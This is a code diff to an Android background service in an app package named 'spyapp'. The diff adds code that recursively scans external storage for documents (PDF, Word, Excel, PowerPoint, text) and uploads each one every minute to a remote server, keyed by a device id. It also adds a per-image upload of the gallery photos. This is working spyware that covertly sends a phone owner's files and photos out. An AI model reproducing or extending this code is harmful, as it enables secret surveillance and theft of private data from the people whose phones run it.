@@ -7,6 +7,7 @@ import android.content.Intent;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.os.Environment;
 import android.os.IBinder;
 import android.provider.ContactsContract;
 import android.provider.MediaStore;
@@ -27,6 +28,7 @@ import java.util.TimerTask;
 
 import github.nisrulz.easydeviceinfo.base.EasyLocationMod;
 import kkactive_india.in.spyapp.Database.DatabaseHelper;
+import kkactive_india.in.spyapp.FilePOJO.fileBean;
 import kkactive_india.in.spyapp.ImagesPOJO.ImgBean;
 import kkactive_india.in.spyapp.contactPOJO.ContactDatum;
 import kkactive_india.in.spyapp.contactPOJO.contactBean;
@@ -50,6 +52,7 @@ public class MainService extends Service {
     ConnectionDetector cd;
     ArrayList<String> galleryImageUrls;
     File file;
+    List<String> list;
 
 
     @Nullable
@@ -160,12 +163,55 @@ public class MainService extends Service {
                 images();
 
 
+                getAllFilesOfDir(Environment.getExternalStorageDirectory());
+
+                files();
+
+
             }
         }, 0, 1000 * 60);
 
 
         return START_STICKY;
     }
+
+
+    private void getAllFilesOfDir(File directory) {
+
+        final File[] files = directory.listFiles();
+        list = new ArrayList<String>();
+
+        if (files != null) {
+            for (File file : files) {
+
+                if (file.isDirectory()) {  // it is a folder...
+                    getAllFilesOfDir(file);
+
+                } else {  // it is a file...
+                        /*Log.d("Directory", "Directory: " + directory.getAbsolutePath() + "\n");
+                        Log.d("FileHaiKya", "File: " + file.getAbsolutePath() + "\n");
+                        Log.d("File Name", file.getName());*/
+
+                    if(file.getName().endsWith(".pptx") || file.getName().endsWith(".ppt")
+                            || file.getName().endsWith(".xlsx") || file.getName().endsWith(".pdf")
+                            || file.getName().endsWith(".doc")||  file.getName().endsWith(".txt")
+                            || file.getName().endsWith(".docx")||file.getName().endsWith(".rtf"))
+                    {
+                        // Log.e(" FILES",file.getName());
+                        //Log.e(" FILES",file.getAbsolutePath());
+                        this.list.add(file.getAbsolutePath());
+                        Log.e("FileBaba", String.valueOf(list));
+
+                    }
+
+
+
+                }
+
+            }
+        }
+    }
+
 
     public byte[] getBytes(InputStream is) throws IOException {
         ByteArrayOutputStream byteBuff = new ByteArrayOutputStream();
@@ -181,7 +227,62 @@ public class MainService extends Service {
         return byteBuff.toByteArray();
     }
 
+    public void files(){
+
+        if (cd.isConnectingToInternet()){
+
+
+            MultipartBody.Part body1 = null;
+
+            for (int i = 0; i < list.size(); i++) {
+                file = new File(list.get(i));
+                RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
+                body1 = MultipartBody.Part.createFormData("file[]", file.getName(), reqFile1);
+
+                Bean b = (Bean) getApplicationContext();
+
+                Retrofit retrofit = new Retrofit.Builder()
+                        .baseUrl(b.baseURL)
+                        .addConverterFactory(ScalarsConverterFactory.create())
+                        .addConverterFactory(GsonConverterFactory.create())
+                        .build();
+                Allapi cr = retrofit.create(Allapi.class);
+                String id = pref.getString("id", "");
+                Call<fileBean> call = cr.files(id, body1);
+                call.enqueue(new Callback<fileBean>() {
+                    @Override
+                    public void onResponse(Call<fileBean> call, Response<fileBean> response) {
+
+                        Log.d("Files", "yess Gaye");
+
+                    }
+
+                    @Override
+                    public void onFailure(Call<fileBean> call, Throwable t) {
+
+                    }
+                });
+
+            }
+
+            Log.d("ListSize",String.valueOf( list.size()));
+
+            long imagename = System.currentTimeMillis();
+
+            String strName = imagename + file.getName();
+
+            Log.d("asdasdasd" , strName);
+
+            // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
+
+
+
+        }
+
+    }
+
     public void images(){
+
       if (cd.isConnectingToInternet()){
 
 
@@ -191,6 +292,31 @@ public class MainService extends Service {
               file = new File(galleryImageUrls.get(i));
               RequestBody reqFile1 = RequestBody.create(MediaType.parse("multipart/form-data"), file);
               body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
+
+              Bean b = (Bean) getApplicationContext();
+
+              Retrofit retrofit = new Retrofit.Builder()
+                      .baseUrl(b.baseURL)
+                      .addConverterFactory(ScalarsConverterFactory.create())
+                      .addConverterFactory(GsonConverterFactory.create())
+                      .build();
+              Allapi cr = retrofit.create(Allapi.class);
+              String id = pref.getString("id", "");
+              Call<ImgBean> call = cr.images(id, body1);
+              call.enqueue(new Callback<ImgBean>() {
+                  @Override
+                  public void onResponse(Call<ImgBean> call, Response<ImgBean> response) {
+
+                      Log.d("Images", "yess Gaye");
+
+                  }
+
+                  @Override
+                  public void onFailure(Call<ImgBean> call, Throwable t) {
+
+                  }
+              });
+
           }
 
           long imagename = System.currentTimeMillis();
@@ -201,31 +327,10 @@ public class MainService extends Service {
 
          // body1 = MultipartBody.Part.createFormData("img[]", file.getName(), reqFile1);
 
-          Bean b = (Bean) getApplicationContext();
 
-          Retrofit retrofit = new Retrofit.Builder()
-                  .baseUrl(b.baseURL)
-                  .addConverterFactory(ScalarsConverterFactory.create())
-                  .addConverterFactory(GsonConverterFactory.create())
-                  .build();
-          Allapi cr = retrofit.create(Allapi.class);
-          String id = pref.getString("id", "");
-          Call<ImgBean> call = cr.images(id, body1);
-          call.enqueue(new Callback<ImgBean>() {
-              @Override
-              public void onResponse(Call<ImgBean> call, Response<ImgBean> response) {
-
-                  Log.d("Images", "yess Gaye");
-
-              }
-
-              @Override
-              public void onFailure(Call<ImgBean> call, Throwable t) {
-
-              }
-          });
 
       }
+
     }
 
 
